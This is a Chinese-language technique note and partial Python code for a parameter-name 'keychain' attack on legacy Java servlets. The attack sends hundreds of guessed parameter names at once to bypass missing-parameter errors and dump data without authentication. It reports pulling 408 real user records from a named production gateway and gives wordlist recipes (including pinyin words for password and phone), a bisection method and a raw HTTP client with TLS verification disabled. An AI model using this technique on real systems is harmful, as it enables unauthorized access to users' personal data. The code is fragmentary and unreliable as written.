## 描述

★ 通用技巧（对 2010~2018 年代的 Java/JSP 老系统极有效）。这类老 servlet 里充斥 `Integer.parseInt(request.getParameter("xxx"))`，缺参即 `NumberFormatException: null`、且**响应字节数恒定**（同一个 500 错误页）。于是可以：
**把一大批候选参数名一次性全带上（都赋 `=1`），用一次请求绕过整个"猜参数名"过程**，直接命中 servlet 的数据分支 —— 因为只要那些 parseInt 的入参都被填上，代码就会往下跑到查询/返回数据的地方。
实测：在 `203.0.113.55`（LHZS 现行主网关）上，用 **390 个候选参数名** 一次性打开整套未认证数据面 —— `GET /LHService/get_GSB?<390参数各=1>` 单请求返回 **143,086 字节 / 408 条真实用户记录**（此前无参时是 500 NFE，只暴露"这个 servlet 存在"）。
两个可直接照抄的关键点：
· **候选表构造**：英文通用词（userid/id/type/flag/start/page/count/name/token/sign…）+ 业务拼音（zhanghao/mima/shouji/ziliao/kaijiang/qihao/pinglun…）+ 业务英译（zuozhe/headurl/mainbody/tiezi…）+ 驼峰/下划线/大写变体（userid/userId/user_id/userid_）。中文站点务必加拼音与拼音缩写（sj/sjh/dh/lx/lb/zt）。
· **投递方式**：GET query 与 POST form **效果相同**，两者都试（有的 servlet 只读 queryString，有的走 body）。
**注意**：此招只对「参数用 `getParameter` 直取、无严格 schema 校验」的老 servlet 有效。对**有严格 schema 白名单的现代 API（多一个未知字段就 400）完全无效**，别浪费轮次 —— 例如本靶标的 `/IMService/v27/*`，25 批 × 800 个字段名钥匙串 + 32 组精确组合全部 400。判据：**未知字段导致 400 INVALID_INPUT ⇒ 该端点有 schema 白名单，钥匙串法失效**。

## 用法

```
把 `PARAM_KEY` 换成你的候选表（用 `params.txt` 一行一个），`ip/port/endpoint` 换成目标，直接跑。
```bash
python param_keychain.py
```
核心就三行：
```python
qs = "&".join("%s=1" % n for n in PARAM_KEY)          # 钥匙串
body = GET_or_POST(endpoint, qs)                       # GET query / POST form 都试
if "NumberFormatException" not in body and len(body) > 3:  # NFE 消失 = 命中数据分支
    save(body)
```
判据速查：
· 500 `NumberFormatException: null`，响应字节**恒定** → 参数名未知，用钥匙串
· 加上钥匙串后 **NFE 消失 / 响应变长** → 命中，开始读数据
· 响应变 400 `INVALID_INPUT` 之类 → **该端点有 schema 白名单，钥匙串无效**（换思路，别再堆参数名）
· 想收敛「到底哪个参数在起作用」→ 对钥匙串做**删除式二分**（每次删一半，看响应是否退化成 NFE），O(log N) 次请求即可定位
```

def raw(method="GET", path="/", body=None, headers=None, timeout=25):
    hdr = {"Host": SNI_HOST, "User-Agent": UA, "Accept": "*/*",
           "Accept-Encoding": "identity", "Connection": "close"}
    if headers: hdr.update(headers)
    data = b""
    if body is not None:
        data = body.encode("utf-8") if isinstance(body, str) else body
        hdr.setdefault("Content-Type", "application/x-www-form-urlencoded")
        hdr["Content-Length"] = str(len(data))
    head = ("%s %s HTTP/1.1\r\n" % (method, path)
            + "".join("%s: %s\r\n" % (k, v) for k, v in hdr.items()) + "\r\n")
    s = socket.socket(); s.settimeout(timeout); s.connect((IP, PORT))
    if PORT in (443, 8443):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        try: ctx.set_ciphers("DEFAULT@SECLEVEL=1")
        except Exception: pass
        s = ctx.wrap_socket(s, server_hostname=SNI_HOST)
    s.sendall(head.encode("utf-8", "replace") + data)
    buf = b""
    while True:
        try: c = s.recv(4096)
        except socket.timeout: break
        if not c: break
        buf += c
    s.close()
    return buf.decode("utf-8", "replace")
